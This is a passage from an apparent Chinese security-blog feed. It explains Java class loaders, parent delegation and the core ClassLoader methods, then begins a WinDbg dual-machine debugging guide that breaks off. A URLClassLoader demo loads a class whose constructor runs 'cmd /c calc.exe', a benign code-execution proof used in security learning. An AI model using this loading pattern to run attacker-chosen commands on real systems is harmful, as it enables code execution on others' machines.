aria-hidden="true">双亲委派模型</figcaption></figure><p>双亲委派的意思是如果一个类加载器需要加载类，那么首先它会把这个类请求委派给父类加载器去完成，每一层都是这样。一直到顶层后，父类的加载器也不能完成该请求时，子类才会尝试加载，。这里父类并不是继承关系，而是委派、逻辑的关系。</p><p>优点：</p><ul><li>能够实现有些类避免重复加载使用，直接先给父加载器加载，不用子加载器再次重复加载。</li><li>保证java核心库的类型安全。比如网络上传输了一个java.lang.Object类，通过双亲模式传递到启动类当中，然后发现其Object类早已被加载过，所以就不会加载这个网络传输过来的java.lang.Object类，保证我们的java核心API库不被篡改，出现类似用户自定义java.lang.Object类的情况。</li></ul><h1 id="类加载器">类加载器</h1><p>类加载器大致分为两种，一种是JVM自带的类加载器，分别为<strong>引导类加载器</strong>、<strong>扩展类加载器</strong>和<strong>APP类加载器/系统类加载器</strong>。另外一种就是用户<strong>自定义的类加载器</strong>，可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器。</p><p>所有java类必须经过jvm加载后才能运行，<code>ClassLoader</code>主要作用就是java类文件的加载，在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>。<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><h2 id="引导类加载器">引导类加载器</h2><blockquote><p>引导类加载器(BootstrapClassLoader)，底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中。(同时处于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类)。</p></blockquote><p>rt.jar里的类都是由<code>BootstrapClassLoader</code>来加载：</p><figure><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421165137430.png" alt="image-20220421165137430"><figcaption aria-hidden="true">image-20220421165137430</figcaption></figure><p><code>BootstrapClassLoader</code>无父加载器 ：</p><p>object类是所有子类的父类，这里使用object：</p><figure><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421165519027.png" alt="image-20220421165519027"><figcaption aria-hidden="true">image-20220421165519027</figcaption></figure><h2 id="扩展类加载器">扩展类加载器</h2><blockquote><p>扩展类加载器(ExtensionsClassLoader)，由sun.misc.Launcher$ExtClassLoader类实现，用来在/jre/lib/ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。</p></blockquote><p>这里的jar包都由扩展类加载器进行加载：</p><figure><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421170413392.png" alt="image-20220421170413392"><figcaption aria-hidden="true">image-20220421170413392</figcaption></figure><p>比如选择dnsns.jar：</p><figure><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421171127650.png" alt="image-20220421171127650"><figcaption aria-hidden="true">image-20220421171127650</figcaption></figure><h2 id="app类加载器系统类加载器">APP类加载器/系统类加载器</h2><blockquote><p>App类加载器/系统类加载器（AppClassLoader），由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它</p></blockquote><figure><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421171428090.png" alt="image-20220421171428090"><figcaption aria-hidden="true">image-20220421171428090</figcaption></figure><h1 id="java类动态加载方式">Java类动态加载方式</h1><p>java类加载分为显式和隐式</p><p>显式：通过java反射或者ClassLoader来动态加载一个类</p><p>隐式：<code>类名.方法名()</code>或者new 示例，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射加载</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.xxx.xx.xx..x.x.x.xx&quot;</span>);<span class="comment">//默认会初始化被加载类的静态属性和方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoader加载</span></span><br><span class="line"><span class="keyword">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;com.xxx.xx.xx..x.x.x.xx&quot;</span>);<span class="comment">//默认不会初始化</span></span><br></pre></td></tr></table></figure><h1 id="classloader类核心方法">ClassLoader类核心方法</h1><p>除了<code>BootstrapClassLoader</code>，其他类加载器都继承<code>ClassLoader</code>，下面是核心方法：</p><p><code>ClassLoader</code>类有如下核心方法：</p><ol type="1"><li><code>loadClass</code>（加载指定的Java类）</li><li><code>findClass</code>（查找指定的Java类）</li><li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li><li><code>defineClass</code>（定义一个Java类,将字节码解析成虚拟机识别的Class对象）</li><li><code>resolveClass</code>（链接指定的Java类）</li></ol><h2 id="loadclass">loadClass</h2><p>加载指定的java类:</p><p>loadClass:</p><ol type="1"><li>首先使用<code>getClassLoadingLock()</code>检查这个类是否被加载过。</li><li>调用<code>findLoadedClass</code>检查是否已经初始化，如果JVM已经初始化过该类，返回类对象</li><li>如果创建当前<code>ClassLoader</code>时传入了父类加载器，就是用父类加载器加载，否则使用<code>Bootstrap ClassLoader</code>加载</li><li>如果上一步还未加载，调用<code>findClass</code>加载类。</li><li>如果当前<code>ClassLoader</code>没有重写<code>findClass</code>方法，返回异常</li><li>........</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, Boolean resolve) <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line"><span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line"><span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c = findBootstrapClassOrNull(name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line"><span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line"><span class="comment">// from the non-null parent class loader</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line"><span class="comment">// to find the class.</span></span><br><span class="line"><span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">c = findClass(name);</span><br><span class="line"><span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">resolveClass(c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="findclass">findClass</h2><p>查找指定的Java类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Finds the class with the specified &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt;.</span></span><br><span class="line"><span class="comment"> * This method should be overridden by class loader implementations that</span></span><br><span class="line"><span class="comment"> * follow the delegation model for loading classes, and will be invoked by</span></span><br><span class="line"><span class="comment"> * the &#123;<span class="doctag">@link</span> #loadClass &lt;tt&gt;loadClass&lt;/tt&gt;&#125; method after checking the</span></span><br><span class="line"><span class="comment"> * parent class loader for the requested class.  The default implementation</span></span><br><span class="line"><span class="comment"> * throws a &lt;tt&gt;ClassNotFoundException&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  name</span></span><br><span class="line"><span class="comment"> *         The &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; of the class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The resulting &lt;tt&gt;Class&lt;/tt&gt; object</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  ClassNotFoundException</span></span><br><span class="line"><span class="comment"> *          If the class could not be found</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>  1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="findloadedclass">findLoadedClass</h2><p>查找JVM已经加载过的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns the class with the given &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; if this</span></span><br><span class="line"><span class="comment"> * loader has been recorded by the Java virtual machine as an initiating</span></span><br><span class="line"><span class="comment"> * loader of a class with that &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt;.  Otherwise</span></span><br><span class="line"><span class="comment"> * &lt;tt&gt;null&lt;/tt&gt; is returned.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  name</span></span><br><span class="line"><span class="comment"> *         The &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; of the class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The &lt;tt&gt;Class&lt;/tt&gt; object, or &lt;tt&gt;null&lt;/tt&gt; if the class has</span></span><br><span class="line"><span class="comment"> *          not been loaded</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>  1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!checkName(name))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> findLoadedClass0(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="defineclass">defineClass</h2><p>定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Converts an array of bytes into an instance of class &lt;tt&gt;Class&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> * Before the &lt;tt&gt;Class&lt;/tt&gt; can be used it must be resolved.  This method</span></span><br><span class="line"><span class="comment"> * is deprecated in favor of the version that takes a &lt;a</span></span><br><span class="line"><span class="comment"> * href=&quot;#name&quot;&gt;binary name&lt;/a&gt; as its first argument, and is more secure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  b</span></span><br><span class="line"><span class="comment"> *         The bytes that make up the class data.  The bytes in positions</span></span><br><span class="line"><span class="comment"> *         &lt;tt&gt;off&lt;/tt&gt; through &lt;tt&gt;off+len-1&lt;/tt&gt; should have the format</span></span><br><span class="line"><span class="comment"> *         of a valid class file as defined by</span></span><br><span class="line"><span class="comment"> *         &lt;cite&gt;The Java&amp;trade; Virtual Machine Specification&lt;/cite&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  off</span></span><br><span class="line"><span class="comment"> *         The start offset in &lt;tt&gt;b&lt;/tt&gt; of the class data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  len</span></span><br><span class="line"><span class="comment"> *         The length of the class data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The &lt;tt&gt;Class&lt;/tt&gt; object that was created from the specified</span></span><br><span class="line"><span class="comment"> *          class data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  ClassFormatError</span></span><br><span class="line"><span class="comment"> *          If the data did not contain a valid class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  IndexOutOfBoundsException</span></span><br><span class="line"><span class="comment"> *          If either &lt;tt&gt;off&lt;/tt&gt; or &lt;tt&gt;len&lt;/tt&gt; is negative, or if</span></span><br><span class="line"><span class="comment"> *          &lt;tt&gt;off+len&lt;/tt&gt; is greater than &lt;tt&gt;b.length&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  SecurityException</span></span><br><span class="line"><span class="comment"> *          If an attempt is made to add this class to a package that</span></span><br><span class="line"><span class="comment"> *          contains classes that were signed by a different set of</span></span><br><span class="line"><span class="comment"> *          certificates than this class, or if an attempt is made</span></span><br><span class="line"><span class="comment"> *          to define a class in a package with a fully-qualified name</span></span><br><span class="line"><span class="comment"> *          that starts with &quot;&#123;<span class="doctag">@code</span> java.&#125;&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>  #loadClass(String, boolean)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>  #resolveClass(Class)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@deprecated</span>  Replaced by &#123;<span class="doctag">@link</span> #defineClass(String, byte[], int, int)</span></span><br><span class="line"><span class="comment"> * defineClass(String, byte[], int, int)&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="resolveclass">resolveClass</h2><p>链接指定java类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Links the specified class.  This (misleadingly named) method may be</span></span><br><span class="line"><span class="comment"> * used by a class loader to link a class.  If the class &lt;tt&gt;c&lt;/tt&gt; has</span></span><br><span class="line"><span class="comment"> * already been linked, then this method simply returns. Otherwise, the</span></span><br><span class="line"><span class="comment"> * class is linked as described in the &quot;Execution&quot; chapter of</span></span><br><span class="line"><span class="comment"> * &lt;cite&gt;The Java&amp;trade; Language Specification&lt;/cite&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  c</span></span><br><span class="line"><span class="comment"> *         The class to link</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  NullPointerException</span></span><br><span class="line"><span class="comment"> *          If &lt;tt&gt;c&lt;/tt&gt; is &lt;tt&gt;null&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>  #defineClass(String, byte[], int, int)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">    resolveClass0(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="用户自定义classloader">用户自定义ClassLoader</h1><p>实际使用中，不仅仅希望使用classpath中的类或者jar包，还可能希望使用本地磁盘或者网上的，这时候就用到了自定义类加载的方式。</p><p>上面的loadclass中，调用的是findClass(String)方法，所以加载自定义类的话重写的是findClass而不是loadClass</p><p>步骤：</p><ol type="1"><li>继承ClassLoader</li><li>重写findClass()</li><li>在findClass中调用defineClass方法</li></ol><h1 id="urlclassloader">URLClassLoader</h1><p>继承自ClassLoader，可以加载本地磁盘和网络中的jar包类文件。</p><p>本地class文件调用：</p><p>先写个java，内容是弹计算器，和sout</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">execcalc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">execcalc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Test success!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;cmd /c calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//E:\github\JavaSecLearn\Code\JavaSecLearn\src\com\yutao\day1</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderLearn</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NullPointerException, InstantiationException, IllegalAccessException, MalformedURLException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">&quot;E:\\github\\JavaSecLearn\\Code\\JavaSecLearn\\src\\com\\yutao\\day1\\&quot;</span>);</span><br><span class="line">        URI uri = file.toURI();</span><br><span class="line">        URL url = uri.toURL();</span><br><span class="line"></span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class clazz = classLoader.loadClass(<span class="string">&quot;com.yutao.day1.execcalc&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弹calc成功解析class文件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;前言流程&quot;&gt;前言+流程&lt;/h1&gt;
&lt;p&gt;java语言依赖JVM，运行的时候，需要先编译成class文件，之后java类初始化的时候会调用&lt;code&gt;java.lang.ClassLoader&lt;/code&gt;加载类字节码，ClassLoa</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="Java" scheme="https://ghostasky.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>WinDbg使用及双机调试</title>
    <link href="https://ghostasky.github.io/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/"/>
    <id>https://ghostasky.github.io/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/</id>
    <published>2022-04-08T16:00:00.000Z</published>
    <updated>2022-07-12T06:29:27.678Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="双机调试">双机调试</h1><p>虚拟机添加串行端口：（如果发现建立的串行端口一直是串行端口2，则把虚拟机硬件中的打印机删除即可创建串行端口1）</p><figure><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409155748490.png" alt="image-20220409155748490"><figcaption aria-hidden="true">image-20220409155748490</figcaption></figure><p>虚拟机中管理员打开powershell，bcdedit /enum查看启动的配置：</p><figure><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409142848941.png" alt="image-20220409142848941"><figcaption aria-hidden="true">image-20220409142848941</figcaption></figure><p>执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bcdedit  /set  “&#123;current&#125;”  bootmenupolicy  Legacy             //修改启动方式为Legacy</span><br><span class="line"></span><br><span class="line">bcdedit  /dbgsettings  SERIAL  DEBUGPORT:1  BAUDRATE:115200     //设置串口1为调试端口，波特率为115200</span><br><span class="line"></span><br><span class="line">bcdedit  /copy  “&#123;current&#125;”   /d  “Debug”      //将当前配置复制到 Debug 启动配置(新建了Debug启动配置)</span><br></pre></td></tr></table></figure><figure><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409143101892.png" alt="image-20220409143101892"><figcaption aria-hidden="true">image-20220409143101892</figcaption></figure><p>新建的启动配置：</p><figure><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409143218989.png" alt="image-20220409143218989"><figcaption aria-hidden="true">image-20220409143218989</figcaption></figure><p>继续执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /debug &quot;&#123;38a233ff-a78b-11ec-a34b-fcc86d824bb2&#125;&quot; on      //打开调试开关</span><br><span class="line">//&#123;&#125;里面的是新建的启动配置的标识符</span><br></pre></td></tr></table></figure><p>查看配置：</p><figure><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409143417309.png" alt="image-20220409143417309"><figcaption aria-hidden="true">image-20220409143417309</figcaption></figure><p>虚拟机重启后显示如下则成功：</p><figure><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409143702060.png" alt="image-20220409143702060"><figcaption aria-hidden="true">image-20220409143702060</figcaption></figure><p>可以选择这样连接：</p><figure><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409144421844.png" alt="image-20220409144421844"><figcaption aria-hidden="true">image-20220409144421844</figcaption></figure><p>也可以<code>-b -k com:pipe,port=\\.\pipe\com_1,resets=0,reconnect -y</code>，高级里面管理员运行：</p><figure><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409145103220.png" alt="image-20220409145103220"><figcaption aria-hidden="true">image-20220409145103220</figcaption></figure><p>成功：<img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409145200846.png" alt="image-20220409145200846"></p><p>下面是配置symbol：</p><p>可以配置环境变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_NT_SYMBOL_PATH</span><br><span class="line">srv*E:\symbols*https://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure><p>也可以直接在Symbol Search Path中加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">srv*E:\symbols*https://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure><h1 id="windbg命令">WinDbg命令</h1><h2 id="ring3">ring3</h2><ul><li><p>version：显示调试器版本信息和已加载的调试器扩展</p></li><li><p>vercommand： 